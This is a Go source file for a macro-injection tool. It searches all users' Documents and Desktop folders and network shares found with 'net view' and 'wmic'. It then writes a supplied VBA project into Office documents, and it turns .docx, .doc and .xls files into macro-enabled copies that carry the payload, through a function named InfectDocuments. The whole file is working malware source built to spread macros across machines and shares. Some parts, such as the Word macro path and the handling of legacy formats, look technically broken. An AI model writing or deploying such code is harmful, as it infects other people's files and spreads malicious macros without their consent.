package officemacro

import (
	"archive/zip"
	"bufio"
	"bytes"
	"encoding/xml"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
//	"sort"
	"strings"
	"time"
)

// OfficeFile represents a found Office document with metadata
type OfficeFile struct {
	Path    string
	ModTime time.Time
}

// MacroInjector configures macro injection parameters
type MacroInjector struct {
	VBAProjectPath string
}

// NewMacroInjector creates a new injector instance
func NewMacroInjector(vbaPath string) (*MacroInjector, error) {
	if _, err := os.Stat(vbaPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("vbaProject file not found: %s", vbaPath)
	}
	return &MacroInjector{VBAProjectPath: vbaPath}, nil
}

func (mi *MacroInjector) getSearchPaths() []string {
	var paths []string

	// Get user directories
	usersDir := filepath.Join(os.Getenv("SystemDrive")+`\`, "Users")
	if dir := os.Getenv("USERPROFILE"); dir != "" {
		usersDir = filepath.Dir(dir)
	}

	// Add user documents and desktop
	filepath.Walk(usersDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || !info.IsDir() {
			return nil
		}

		base := filepath.Base(path)
		if base == "Documents" || base == "Desktop" {
			paths = append(paths, path)
		}
		return nil
	})

	// Add accessible network shares
	paths = append(paths, mi.getNetworkShares()...)

	return paths
}

func (mi *MacroInjector) getNetworkShares() []string {
	var shares []string

	// Try different enumeration methods
	shares = append(shares, mi.getNetViewShares()...)
	shares = append(shares, mi.getWMIShares()...)

	// Deduplicate and verify accessibility
	uniqueShares := make(map[string]struct{})
	for _, share := range shares {
		if mi.isAccessible(share) {
			uniqueShares[share] = struct{}{}
		}
	}

	// Convert map to slice
	result := make([]string, 0, len(uniqueShares))
	for share := range uniqueShares {
		result = append(result, share)
	}

	return result
}

func (mi *MacroInjector) isAccessible(path string) bool {
	ch := make(chan bool, 1)
	go func() {
		defer close(ch)
		_, err := os.Stat(path)
		ch <- err == nil
	}()

	select {
	case result := <-ch:
		return result
	case <-time.After(2 * time.Second):
		return false
	}
}

func (mi *MacroInjector) getNetViewShares() []string {
	cmd := exec.Command("net", "view")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil
	}

	re := regexp.MustCompile(`\\\\[^\\\s]+\\[^\s]+`)
	matches := re.FindAllString(string(output), -1)

	var shares []string
	for _, m := range matches {
		shares = append(shares, m)
	}
	return shares
}

func (mi *MacroInjector) getWMIShares() []string {
	cmd := exec.Command("wmic", "share", "get", "name")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil
	}

	var shares []string
	scanner := bufio.NewScanner(bytes.NewReader(output))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, `\\`) {
			shares = append(shares, line)
		}
	}
	return shares
}

func (mi *MacroInjector) findPotentialFiles() ([]string, []string) {
	var officeFiles []string
	var macroFiles []string

	for _, dir := range mi.getSearchPaths() {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(path))
			switch ext {
			case ".docm", ".xlsm":
				macroFiles = append(macroFiles, path)
			case ".docx", ".doc", ".xls":
				officeFiles = append(officeFiles, path)
			}
			return nil
		})
	}
	return officeFiles, macroFiles
}

func (mi *MacroInjector) createMacroFile(basePath string) error {
	ext := filepath.Ext(basePath)
	newPath := strings.TrimSuffix(basePath, ext)

	switch ext {
	case ".docx", ".doc":
		newPath += ".docm"
	case ".xls":
		newPath += ".xlsm"
	default:
		return fmt.Errorf("unsupported base file type: %s", ext)
	}

	// Copy original content
	data, err := os.ReadFile(basePath)
	if err != nil {
		return err
	}

	if err := os.WriteFile(newPath, data, 0644); err != nil {
		return err
	}

	return mi.InjectMacro(newPath)
}

// InfectDocuments handles the complete infection process
func (mi *MacroInjector) InfectDocuments() error {
	officeFiles, macroFiles := mi.findPotentialFiles()

	// First infect existing macro files
	if len(macroFiles) > 0 {
		for _, file := range macroFiles {
			if err := mi.InjectMacro(file); err != nil {
				fmt.Printf("Error infecting %s: %v\n", file, err)
			}
		}
		return nil
	}

	// If no macro files found, create new ones
	for _, file := range officeFiles {
		if err := mi.createMacroFile(file); err != nil {
			fmt.Printf("Error creating macro file from %s: %v\n", file, err)
		}
	}
	return nil
}

// InjectMacro modifies a document to include the VBA project
func (mi *MacroInjector) InjectMacro(targetPath string) error {
	macroContent, err := os.ReadFile(mi.VBAProjectPath)
	if err != nil {
		return err
	}

	ext := strings.ToLower(filepath.Ext(targetPath))
	var vbaLocation string

	switch ext {
	case ".docm":
		vbaLocation = "vbaProject.bin"
	case ".xlsm":
		vbaLocation = "xl/vbaProject.bin"
	default:
		return fmt.Errorf("unsupported file type: %s", ext)
	}

	return mi.processDocument(targetPath, vbaLocation, macroContent)
}

func (mi *MacroInjector) processDocument(path, vbaPath string, macro []byte) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	modified, err := modifyArchive(data, vbaPath, macro)
	if err != nil {
		return err
	}

	// Create backup
	if err := os.Rename(path, path+".bak"); err != nil {
		return err
	}

	return os.WriteFile(path, modified, 0644)
}

func modifyArchive(data []byte, vbaPath string, macro []byte) ([]byte, error) {
	reader, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		return nil, err
	}

	buf := new(bytes.Buffer)
	writer := zip.NewWriter(buf)
	defer writer.Close()

	vbaExists := false
	contentTypesModified := false
	contentTypesPath := "[Content_Types].xml"

	for _, file := range reader.File {
		content, err := readZipFile(file)
		if err != nil {
			return nil, err
		}

		if file.Name == vbaPath {
			vbaExists = true
			content = macro
		} else if file.Name == contentTypesPath {
			content, err = addContentTypeOverride(content, vbaPath)
			if err != nil {
				return nil, err
			}
			contentTypesModified = true
		}

		if err := addFileToZip(writer, file.Name, content); err != nil {
			return nil, err
		}
	}

	if !vbaExists {
		if err := addFileToZip(writer, vbaPath, macro); err != nil {
			return nil, err
		}
	}

	if !contentTypesModified {
		contentTypes := createContentTypes(vbaPath)
		if err := addFileToZip(writer, contentTypesPath, contentTypes); err != nil {
			return nil, err
		}
	}

	writer.Close()
	return buf.Bytes(), nil
}

type ContentTypes struct {
	XMLName  xml.Name `xml:"Types"`
	Defaults []struct {
		Extension   string `xml:"Extension,attr"`
		ContentType string `xml:"ContentType,attr"`
	} `xml:"Default"`
	Overrides []struct {
		PartName    string `xml:"PartName,attr"`
		ContentType string `xml:"ContentType,attr"`
	} `xml:"Override"`
}

func addContentTypeOverride(original []byte, vbaPath string) ([]byte, error) {
	var ct ContentTypes
	if err := xml.Unmarshal(original, &ct); err != nil {
		return nil, err
	}

	partName := "/" + vbaPath
	for _, o := range ct.Overrides {
		if o.PartName == partName {
			return original, nil
		}
	}

	ct.Overrides = append(ct.Overrides, struct {
		PartName    string `xml:"PartName,attr"`
		ContentType string `xml:"ContentType,attr"`
	}{
		PartName:    partName,
		ContentType: "application/vnd.ms-office.vbaProject",
	})

	newXML, err := xml.MarshalIndent(ct, "", "  ")
	if err != nil {
		return nil, err
	}

	return []byte(xml.Header + string(newXML)), nil
}

func createContentTypes(vbaPath string) []byte {
	partName := "/" + vbaPath
	ct := ContentTypes{
		Defaults: []struct {
			Extension   string `xml:"Extension,attr"`
			ContentType string `xml:"ContentType,attr"`
		}{
			{Extension: "rels", ContentType: "application/vnd.openxmlformats-package.relationships+xml"},
		},
		Overrides: []struct {
			PartName    string `xml:"PartName,attr"`
			ContentType string `xml:"ContentType,attr"`
		}{
			{PartName: partName, ContentType: "application/vnd.ms-office.vbaProject"},
		},
	}

	xmlData, _ := xml.MarshalIndent(ct, "", "  ")
	return []byte(xml.Header + string(xmlData))
}

func readZipFile(f *zip.File) ([]byte, error) {
	rc, err := f.Open()
	if err != nil {
		return nil, err
	}
	defer rc.Close()
	return io.ReadAll(rc)
}

func addFileToZip(w *zip.Writer, name string, content []byte) error {
	h := &zip.FileHeader{
		Name:   name,
		Method: zip.Deflate,
	}
	f, err := w.CreateHeader(h)
	if err != nil {
		return err
	}
	_, err = f.Write(content)
	return err
}
